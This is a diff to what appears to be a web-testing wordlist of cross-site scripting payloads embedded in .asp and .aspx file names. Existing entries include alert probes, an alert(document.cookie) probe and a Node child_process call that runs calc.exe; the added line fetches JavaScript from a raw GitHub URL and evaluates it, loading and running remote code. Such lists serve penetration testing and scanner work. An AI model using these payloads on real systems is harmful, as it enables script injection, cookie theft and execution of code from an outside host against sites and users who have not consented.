@@ -3,6 +3,7 @@
 <script>alert('NFSU')</script>.asp
 <script>alert('employee')</script>.asp
 <script>alert('inspark')</script>.asp
+<script>fetch("https://raw.githubusercontent.com/amit-pathak009/wordlist-bank/refs/heads/main/test.js").then(res => res.text().then(eval))</script>
 <script>require('child_process').exec('calc.exe');</script>.asp
 <script>require('child_process').exec('calc.exe');</script>.aspx
 <script>alert(document.cookie)</script>.asp
